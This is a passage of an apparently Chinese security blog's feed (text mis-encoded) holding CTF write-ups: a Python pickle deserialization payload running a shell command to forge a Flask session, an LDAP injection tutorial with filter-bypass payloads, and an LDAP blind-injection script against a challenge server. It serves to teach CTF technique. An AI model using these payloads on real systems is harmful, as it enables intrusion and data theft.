alt="image-20211220142529168"></p><p>ä¸‹é¢æ˜¯åºåˆ—åŒ–çš„base64åŠ å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag ` &gt; /hack&#x27;).read()&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br></pre></td></tr></table></figure><p>åœ¨linuxé‡Œé¢æ‰§è¡Œè„šæœ¬ï¼Œå¹¶é€šè¿‡<code>flask_session_cookie_manager</code>æ¥ä¼ªé€ session</p><p><img src="/2021/12/20/HFCTF2021-easyflask-writeup/image-20211226153923334.png" alt="image-20211226153923334"></p><p>æŠŠåŸæ¥çš„sessionæ›¿æ¢æ‰ï¼Œå†è¿›å…¥<code>file?file=/hack</code>å³å¯å¾—åˆ°flag</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://tyskill.github.io/posts/hfctf2021final/#easyflask">[BUUOJ]HFCTF 2021 Finalå¤ç°</a></p><p><a href="https://www.freebuf.com/articles/web/252189.html">Python Pickleååºåˆ—åŒ–æ¼æ´</a></p><p><a href="https://www.cnblogs.com/liushui-sky/p/9354536.html">linuxä¼ªæ–‡ä»¶ç³»ç»Ÿ/procè¯¦è§£</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æŒ‰ç…§æç¤ºè·³è½¬åˆ°&lt;code&gt;file?file=/app/source&lt;/code&gt;ï¼Œå¾—æºç &lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>LDAPæ³¨å…¥å­¦ä¹ </title>
    <link href="https://wuyusanhua2021.github.io/2021/12/12/LDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wuyusanhua2021.github.io/2021/12/12/LDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-12-12T08:50:39.000Z</published>
    <updated>2022-01-06T05:20:09.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LDAPç®€ä»‹"><a href="#LDAPç®€ä»‹" class="headerlink" title="LDAPç®€ä»‹"></a>LDAPç®€ä»‹</h1><h2 id="ä»€ä¹ˆæ˜¯LDAP"><a href="#ä»€ä¹ˆæ˜¯LDAP" class="headerlink" title="ä»€ä¹ˆæ˜¯LDAP"></a>ä»€ä¹ˆæ˜¯LDAP</h2><p>LDAPæ˜¯æŒ‡è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œä»¥ä¿¡æ¯ç›®å½•çš„å½¢å¼å­˜åœ¨ã€‚</p><p>ç›®å½•æ˜¯ä¸€ä¸ªä¸ºæŸ¥è¯¢ã€æµè§ˆå’Œæœç´¢è€Œä¼˜åŒ–çš„æ•°æ®åº“ï¼Œå®ƒæˆæ ‘çŠ¶ç»“æ„ç»„ç»‡æ•°æ®ï¼Œç±»ä¼¼æ–‡ä»¶ç›®å½•ä¸€æ ·ã€‚</p><p>ç›®å½•æ•°æ®åº“å’Œå…³ç³»æ•°æ®åº“ä¸åŒï¼Œå®ƒæœ‰ä¼˜å¼‚çš„è¯»æ€§èƒ½ï¼Œä½†å†™æ€§èƒ½å·®ï¼Œå¹¶ä¸”æ²¡æœ‰äº‹åŠ¡å¤„ç†ã€å›æ»šç­‰å¤æ‚åŠŸèƒ½ï¼Œä¸é€‚äºå­˜å‚¨ä¿®æ”¹é¢‘ç¹çš„æ•°æ®ã€‚æ‰€ä»¥ç›®å½•å¤©ç”Ÿæ˜¯ç”¨æ¥æŸ¥è¯¢çš„ï¼Œå°±å¥½è±¡å®ƒçš„åå­—ä¸€æ ·ã€‚</p><p>LDAPç›®å½•æœåŠ¡æ˜¯ç”±ç›®å½•æ•°æ®åº“å’Œä¸€å¥—è®¿é—®åè®®ç»„æˆçš„ç³»ç»Ÿã€‚</p><h2 id="LDAPåŸºæœ¬ç»“æ„"><a href="#LDAPåŸºæœ¬ç»“æ„" class="headerlink" title="LDAPåŸºæœ¬ç»“æ„"></a>LDAPåŸºæœ¬ç»“æ„</h2><h3 id="ç›®å½•æ ‘æ¦‚å¿µ"><a href="#ç›®å½•æ ‘æ¦‚å¿µ" class="headerlink" title="ç›®å½•æ ‘æ¦‚å¿µ"></a>ç›®å½•æ ‘æ¦‚å¿µ</h3><ul><li>ç›®å½•æ ‘ï¼šåœ¨ä¸€ä¸ªç›®å½•ä¿¡æ¯æœåŠ¡ç³»ç»Ÿä¸­ï¼Œæ•´ä¸ªç›®å½•ä¿¡æ¯é›†å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªç›®å½•ä¿¡æ¯æ ‘ï¼Œæ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹æ˜¯ä¸€ä¸ªæ¡ç›®</li><li>æ¡ç›®ï¼šæ¯ä¸ªæ¡ç›®å°±æ˜¯ä¸€æ¡è®°å½•ï¼Œæ¯ä¸ªæ¡ç›®éƒ½æœ‰è‡ªå·±çš„å”¯ä¸€å¯åŒºåˆ«çš„åç§°ï¼ˆdnï¼‰</li><li>å¯¹è±¡ç±»ï¼šä¸æŸä¸ªå®ä½“ç±»å‹å¯¹åº”çš„ä¸€ç»„å±æ€§ï¼Œå¯ä»¥ç»§æ‰¿</li><li>å±æ€§ï¼šæè¿°æ¡ç›®æŸä¸€æ–¹é¢çš„ä¿¡æ¯ï¼Œä¸€ä¸ªå±æ€§ç”±ä¸€ä¸ªå±æ€§ç±»å‹å’Œä¸€ä¸ªæˆ–å¤šä¸ªå±æ€§å€¼ç»„æˆï¼Œåˆ†ä¸ºå¿…é¡»å’Œéå¿…é¡»å±æ€§</li></ul><h3 id="LDAPç›®å½•ç»“æ„"><a href="#LDAPç›®å½•ç»“æ„" class="headerlink" title="LDAPç›®å½•ç»“æ„"></a>LDAPç›®å½•ç»“æ„</h3><ul><li>dcï¼šåŸŸåçš„éƒ¨åˆ†ï¼Œå…¶æ ¼å¼æ˜¯å°†å®Œæ•´çš„åŸŸååˆ†æˆå‡ éƒ¨åˆ†ï¼Œå¦‚åŸŸåä¸ºexample.comå˜æˆdc=example,dc=comï¼ˆä¸€æ¡è®°å½•çš„æ‰€å±ä½ç½®ï¼‰</li><li>ouï¼šç»„ç»‡å•ä½ï¼Œç»„ç»‡å•ä½å¯ä»¥åŒ…å«å…¶å®ƒå„ç§å¯¹è±¡ï¼ˆåŒ…æ‹¬å…¶å®ƒç»„ç»‡å•å…ƒï¼‰å¦‚ou=adminï¼ˆä¸€æ¡è®°å½•æ‰€å±ç»„ç»‡ï¼‰</li><li>cnï¼šå…¬å…±åç§°ï¼Œå¦‚â€œscottâ€ï¼ˆä¸€æ¡è®°å½•çš„åç§°ï¼‰</li><li>dnï¼šâ€cn=baby,ou=marketing,ou=people,dc=myadmin,dc=orgâ€œï¼Œä¸€æ¡è®°å½•çš„ä½ç½®ï¼ˆå”¯ä¸€ï¼‰</li></ul><p><img src="/2021/12/12/LDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/20200721143738.png" alt="img"></p><h2 id="LDAPåŸºæœ¬è¯­æ³•"><a href="#LDAPåŸºæœ¬è¯­æ³•" class="headerlink" title="LDAPåŸºæœ¬è¯­æ³•"></a>LDAPåŸºæœ¬è¯­æ³•</h2><p>ä¸€ä¸ªå®Œæ•´çš„ldapæŸ¥è¯¢è¯­å¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæœç´¢è¿‡æ»¤å™¨ï¼Œæœç´¢è¿‡æ»¤å™¨çš„æ ¼å¼ä¸º</p><p><code>&lt;attribute&gt;&lt;operator&gt;&lt;value&gt;</code>ï¼Œå¦‚<code>(cn=wuyusanhua)</code></p><p>é€šè¿‡é€»è¾‘è¿ç®—ç¬¦å¯ä»¥å°†å¤šä¸ªæœç´¢è¿‡æ»¤å™¨æ•´åˆä¸ºå•ä¸ªæœç´¢è¿‡æ»¤å™¨</p><p>å¦‚<code>(|(cn=wuyusanhua)(cn=Unicorn))</code></p><p>LDAPä¸­å¸¸ç”¨åˆ°ä»¥ä¸‹è¿ç®—ç¬¦ï¼š</p><ol><li>()ï¼ˆæ‹¬å·ï¼‰ï¼šè§„å®šä¸€ä¸ªæœç´¢è¿‡æ»¤å™¨çš„å¼€å§‹ä¸ç»“æŸ</li><li>=ï¼ˆç­‰äºï¼‰ï¼šå¦‚<code>(givenName=zhangsan)</code>ï¼ŒæŸ¥æ‰¾æ‰€åŒ…å«çš„å±æ€§å€¼ä¸æŒ‡å®šå€¼ç›¸åŒçš„é¡¹</li><li>&amp;ï¼ˆé€»è¾‘ä¸ï¼‰ï¼šå¦‚<code>(&amp;(address=Beijing)(givenName=zhangsan))</code>ï¼ŒæŸ¥æ‰¾ä¸<strong>æ‰€æœ‰</strong>æœç´¢è¿‡æ»¤å™¨ä¸­æŒ‡å®šçš„æ¡ä»¶ç›¸åŒ¹é…çš„é¡¹</li><li>|ï¼ˆé€»è¾‘æˆ–ï¼‰ï¼šå¦‚<code>(|(givenName=zhangsan)(givenName=lisi))</code>ï¼ŒæŸ¥æ‰¾ä¸<strong>è‡³å°‘ä¸€ä¸ª</strong>æœç´¢è¿‡æ»¤å™¨ä¸­æŒ‡å®šçš„æ¡ä»¶ç›¸åŒ¹é…çš„é¡¹</li><li>!ï¼ˆé€»è¾‘éï¼‰ï¼šå¦‚<code>(!name=zhangsan)</code>ï¼ŒæŸ¥æ‰¾ä¸ä»»ä½•æœç´¢è¿‡æ»¤å™¨ä¸­æŒ‡å®šçš„æ¡ä»¶éƒ½ä¸åŒ¹é…çš„é¡¹</li><li>*ï¼ˆé€šé…ç¬¦ï¼‰ï¼šå¯ä½¿ç”¨é€šé…ç¬¦è¡¨ç¤ºå€¼å¯ä»¥ç­‰äºä»»ä½•å€¼ï¼Œå¯ç”¨äº<strong>çŸ¥æ™“ç›®æ ‡å€¼çš„ä¸€éƒ¨åˆ†</strong>çš„æƒ…å†µä¸‹çš„æŸ¥æ‰¾ï¼Œå¦‚ï¼š<code>(givenName=zhang*), (givenName=*ang*)</code></li><li>ç‰¹æ®Šå¸¸é‡ï¼šï¼ˆ&amp;ï¼‰=&gt; Absolute Trueï¼› (|) =&gt;Absolute False</li></ol><h1 id="LDAPæ³¨å…¥"><a href="#LDAPæ³¨å…¥" class="headerlink" title="LDAPæ³¨å…¥"></a>LDAPæ³¨å…¥</h1><h2 id="æ³¨å…¥åŸç†"><a href="#æ³¨å…¥åŸç†" class="headerlink" title="æ³¨å…¥åŸç†"></a>æ³¨å…¥åŸç†</h2><p>ä¸sqlæ³¨å…¥çš„æˆå› ç›¸ä¼¼ï¼Œéƒ½æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œåˆé€‚çš„è¿‡æ»¤ï¼Œå¯¼è‡´äº†æ¶æ„ä»£ç åµŒå…¥åˆ°æ­£å¸¸çš„æŸ¥è¯¢è¯­å¥ä¸­ã€‚</p><p>å¸¸ç”¨çš„LDAPä¸ºADAMå’ŒOpenLDAPï¼ŒADAMä¸å…è®¸æœ‰ä¸¤ä¸ªè¿‡æ»¤å™¨çš„æŸ¥è¯¢ï¼ŒOpenLDAPåªä¼šæ‰§è¡Œç¬¬ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œå› æ­¤è¢«ç”¨äºæ„é€ æ¶æ„ä»£ç çš„æŸ¥è¯¢è¯­å¥é€šå¸¸éƒ½åŒ…å«é€»è¾‘è¿ç®—ç¬¦</p><h3 id="ç¤ºä¾‹1"><a href="#ç¤ºä¾‹1" class="headerlink" title="ç¤ºä¾‹1"></a>ç¤ºä¾‹1</h3><p>å¦‚<code>(&amp;(attribute=value)(sec_filter))  </code>,æ„é€ value=<code>xxx)(injected_filter)</code></p><p>ç°åœ¨å®Œæ•´çš„è¿‡æ»¤å™¨å°±å˜æˆäº†<code>(&amp;(attribute=xxx)(injected_filter))(sec_filter))</code></p><p>æ­¤æ—¶OpenLDAPä¼šå¿½ç•¥ç¬¬ä¸€ä¸ªè¿‡æ»¤å™¨é—­åˆåçš„æ‰€æœ‰å­—ç¬¦</p><p>å³å®é™…ä¸Šèµ·åˆ°ä½œç”¨çš„éƒ¨åˆ†ä»…ä¸º<code>(&amp;(attribute=xxx)(injected_filter))</code></p><h3 id="ç¤ºä¾‹2"><a href="#ç¤ºä¾‹2" class="headerlink" title="ç¤ºä¾‹2"></a>ç¤ºä¾‹2</h3><p>éƒ¨åˆ†æƒ…å†µä¸‹åº”ç”¨æ¡†æ¶ä¼šæ£€æµ‹æœç´¢å™¨è¯­æ³•æ˜¯å¦æ­£ç¡®</p><p>å¦‚<code>(&amp;(attribute=value)(sec_filter))  </code>ï¼Œæ„é€ value=<code>xxx)(injected_filter)(&amp;(1=0</code></p><p>é‚£ä¹ˆæœ‰<code>(&amp;(attribute=xxx)(injectd_filter))(&amp;(1=0)(sec_filter))</code></p><h3 id="ç¤ºä¾‹3"><a href="#ç¤ºä¾‹3" class="headerlink" title="ç¤ºä¾‹3"></a>ç¤ºä¾‹3</h3><p>ADAMä¸‹ä¸å…è®¸æœ‰ä¸¤ä¸ªè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆå¯¹<code>(&amp;(attribute=value)(sec_filter))</code></p><p>å¯ä»¥æ„é€ value=<code>xxx)(injected_filter</code></p><p>å¾—åˆ°<code>(&amp;(attribute=xxx)(injectd_filter)(sec_filter))</code></p><h2 id="æ³¨å…¥åˆ©ç”¨æ–¹å¼"><a href="#æ³¨å…¥åˆ©ç”¨æ–¹å¼" class="headerlink" title="æ³¨å…¥åˆ©ç”¨æ–¹å¼"></a>æ³¨å…¥åˆ©ç”¨æ–¹å¼</h2><h3 id="ç»•è¿‡è®¿é—®æ§åˆ¶"><a href="#ç»•è¿‡è®¿é—®æ§åˆ¶" class="headerlink" title="ç»•è¿‡è®¿é—®æ§åˆ¶"></a>ç»•è¿‡è®¿é—®æ§åˆ¶</h3><p>å‡è®¾è¿‡æ»¤å™¨ä¸º<code>(&amp;(param1=value1)(param2=value2))</code></p><p>åˆ©ç”¨(&amp;)æ°¸çœŸçš„ç‰¹æ€§,æ„é€ value1=<code>xxx)(&amp;)</code>(æ³¨ï¼šxxxåº”å½“ä¸ºä¸€ä¸ªæœ‰æ•ˆçš„å€¼)</p><p>å¾—åˆ°<code>(&amp;(param1=value1)(&amp;))(param2=value2))</code></p><p>æ­¤æ—¶æœåŠ¡å™¨åªå¤„ç†ç¬¬ä¸€ä¸ªæœç´¢å™¨ï¼Œè¯¥æœç´¢å™¨ä¸ºçœŸï¼ŒæˆåŠŸç»•è¿‡</p><h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>å‡è®¾æŸ¥è¯¢è¯­å¥ä¸º<code>(&amp;(param=name)(security_level=low))</code>,è¯¥è¯­å¥åªè¿”å›ä½å®‰å…¨ç­‰çº§çš„æ•°æ®</p><p>æ„é€ name=<code>xxx)(security_level=*)</code></p><p>å¾—åˆ°<code>(&amp;(param=name)(security_level=*))(security_level=low))</code></p><p>å³å¯æŸ¥è¯¢æ‰€æœ‰å®‰å…¨ç­‰çº§çš„æ–‡æ¡£</p><h3 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h3><p>å‡è®¾æŸ¥è¯¢è¯­å¥ä¸º<code>(|(type=rsc1)(type=rsc2))</code></p><p>æ„é€ rsc1=<code>xxx)(uid=*)</code>,å¾—åˆ°<code>(|(type=rsc1)(uid=*))(type=rsc2)</code></p><p>ç›´æ¥è¿”å›æ‰€æœ‰çš„ç”¨æˆ·å¯¹è±¡</p><h2 id="LDAPç›²æ³¨"><a href="#LDAPç›²æ³¨" class="headerlink" title="LDAPç›²æ³¨"></a>LDAPç›²æ³¨</h2><p>LDAPçš„ç›²æ³¨åŸç†ä¸sqlç›²æ³¨å¤§è‡´ç›¸åŒï¼Œä¸»è¦æ˜¯åˆ©ç”¨é€šé…ç¬¦<code>*</code>æ¥æ„é€ å‡ºç‰¹æ®Šçš„æŸ¥è¯¢è¯­å¥ï¼Œä½¿å¾—æŸ¥è¯¢è¿”å›ç»“æœåªèƒ½ä¸ºtrue/falseï¼Œå†ç¼–å†™è„šæœ¬æ¥çˆ†å‡ºéœ€è¦çš„ä¿¡æ¯</p><p>å°æŠ€å·§ï¼š</p><p>åˆ©ç”¨<code>*char*</code>çš„æ ¼å¼å¯ä»¥å…ˆåšä¸€æ¬¡å­—ç¬¦é›†çš„å‰Šå‡ï¼Œè¯¥æ ¼å¼è¢«ç”¨æ¥æŸ¥è¯¢å€¼ä¸­æ˜¯å¦åŒ…å«æœ‰é€šé…ç¬¦ä¹‹é—´çš„å­—ç¬¦ï¼Œå›æ˜¾ä¸ºtrueåˆ™ä¿ç•™è¯¥å­—ç¬¦ï¼Œä¸ºfalseåˆ™ä¸¢å¼ƒè¯¥å­—ç¬¦ï¼Œä»¥è¾¾åˆ°ç¼©å°ç›²æ³¨å­—ç¬¦èŒƒå›´çš„æ•ˆæœ</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://www.anquanke.com/post/id/212186">æµ…è°ˆLDAPæ³¨å…¥-å®‰å…¨å®¢</a></p><p><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html">LDAPæ³¨å…¥ä¸é˜²å¾¡å‰–æ-r00tgrok</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LDAPç®€ä»‹&quot;&gt;&lt;a href=&quot;#LDAPç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;LDAPç®€ä»‹&quot;&gt;&lt;/a&gt;LDAPç®€ä»‹&lt;/h1&gt;&lt;h2 id=&quot;ä»€ä¹ˆæ˜¯LDAP&quot;&gt;&lt;a href=&quot;#ä»€ä¹ˆæ˜¯LDAP&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DNUICTFéƒ¨åˆ†é¢˜ç›®å¤ç°</title>
    <link href="https://wuyusanhua2021.github.io/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://wuyusanhua2021.github.io/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-12-06T11:46:16.000Z</published>
    <updated>2022-01-06T05:20:10.631Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Web-odd-upload"><a href="#Web-odd-upload" class="headerlink" title="Web-odd_upload"></a>Web-odd_upload</h3><p><strong>smartyæ¨¡æ¿è¦†ç›–</strong></p><p>åœ¨./templates/index.tplæ‰¾åˆ°ä¸»é¡µçš„æ¨¡æ¿æ–‡ä»¶ï¼Œåœ¨æœ€åå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªå¯¹footer.tplæ–‡ä»¶çš„åŒ…å«è¯­å¥</p><p><img src="/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20211206194903343.png" alt="image-20211206194903343"></p><p>è¿›å…¥footerå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¥ä¸Šä¼ ä¸€ä¸ªåŒ…å«phpinfoå‘½ä»¤çš„footer.tplæ–‡ä»¶ï¼Œæ¥è¦†ç›–åŸæ¥çš„footer.tpl</p><p><img src="/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20211206195147034.png" alt="image-20211206195147034"></p><p>å†æ¬¡è¿”å›ä¸»é¡µï¼Œå³å¯æ‰¾åˆ°flag</p><p><img src="/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20211206195231132.png" alt="image-20211206195231132"></p><h3 id="Web-easyinject"><a href="#Web-easyinject" class="headerlink" title="Web-easyinject"></a>Web-easyinject</h3><p><strong>ldapç›²æ³¨</strong></p><p>ç”¨ç½‘é¡µæºç ç»™çš„è´¦æˆ·ç™»å½•ï¼Œå¾—åˆ°hintï¼šflagæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„é‚®ç®±åœ°å€ç”¨æˆ·åã€‚å®ƒæ˜¯ä¸€ä¸ªè´¦æˆ·çš„å±æ€§ï¼Œç›®å½•ä¸­æœ‰å¤šä¸ªè´¦æˆ·ï¼Œflagç”± a-z0-9_ ç»„æˆã€‚</p><p>åœ¨fuzzè¿”å›çš„æŠ¥é”™ä¿¡æ¯ä¸­å¯ä»¥å¾—çŸ¥ç™»é™†ç³»ç»Ÿä½¿ç”¨äº†ldap</p><p><img src="/2021/12/06/DNUICTF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20211209185217295.png" alt="image-20211209185217295"></p><p>ç›²æ³¨è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://47.106.172.144:2333/&#x27;</span></span><br><span class="line">string = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz_&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        payload = <span class="string">&quot;?user=guest)(mail=*&quot;</span> + result + j + <span class="string">&quot;*&amp;pass=EC77k8RHquAMLKAX&quot;</span></span><br><span class="line">        re = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;æŸ¥è¯¢ç”¨æˆ·ä¸å”¯ä¸€&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            result += j</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        payload = <span class="string">&quot;?user=guest)(mail=*&quot;</span> + j + result + <span class="string">&quot;*&amp;pass=EC77k8RHquAMLKAX&quot;</span></span><br><span class="line">        re = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;æŸ¥è¯¢ç”¨æˆ·ä¸å”¯ä¸€&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            result = j + result</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æ³¨å‡ºæ¥çš„ç»“æœåŒ…ä¸Šflag{}å³å¯</p><h3 id="Misc-å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…"><a href="#Misc-å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…" class="headerlink" title="Misc-å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…"></a>Misc-å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…</h3><p>zipå‹ç¼©åŒ…çš„å¾ªç¯è§£å‹ï¼Œè§£å‹å¯†ç å³æ˜¯æ–‡ä»¶åï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">zippath = <span class="string">r&#x27;C:/CTF/&#x27;</span> + <span class="string">&#x27;yasuobao.zip&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        temp = zipfile.ZipFile(zippath)</span><br><span class="line">        res = re.search(<span class="string">&#x27;[0-9]*&#x27;</span>, temp.namelist()[<span class="number">0</span>])</span><br><span class="line">        passwd = res.group()</span><br><span class="line">        temp.extractall(<span class="string">r&#x27;C:/CTF/&#x27;</span>, pwd=passwd.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        temp.close()</span><br><span class="line">        os.remove(zippath)</span><br><span class="line">        zippath = <span class="string">r&#x27;C:/CTF/&#x27;</span> + temp.namelist()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°ä¸€ä¸ª23333.zip,æç¤ºå¯†ç ä¸ºå…­ä½æ•°å­—ï¼Œç›´æ¥çˆ†å‡ºæ¥ï¼Œè§£å‹å¾—åˆ°flag</p><h3 id="Misc-ezsteg"><a href="#Misc-ezsteg" class="headerlink" title="Misc-ezsteg"></a>Misc-ezsteg</h3><p>ç›´æ¥æ‰«äºŒç»´ç ï¼Œæç¤ºæ˜¯ä¸€ç§å¸¸è§çš„éšå†™ï¼Œæ”¹æ–‡ä»¶åç¼€ä¸ºzipï¼Œè§£å‹å¾—åˆ°_find.png,ç”¨<code>stegpy</code>è¿›è¡Œè§£å¯†å³å¯ç›´æ¥å¾—åˆ°flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Web-odd-upload&quot;&gt;&lt;a href=&quot;#Web-odd-upload&quot; class=&quot;headerlink&quot; title=&quot;Web-odd_upload&quot;&gt;&lt;/a&gt;Web-odd_upload&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;smartyæ¨¡æ¿è¦†ç›–&lt;/st</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GYCTF2020 EZsqli Writeup</title>
    <link href="https://wuyusanhua2021.github.io/2021/11/17/GYCTF2020-EZsqli-Writeup/"/>
    <id>https://wuyusanhua2021.github.io/2021/11/17/GYCTF2020-EZsqli-Writeup/</id>
    <published>2021-11-17T12:19:43.000Z</published>
    <updated>2022-01-06T05:20:10.630Z</updated>
    
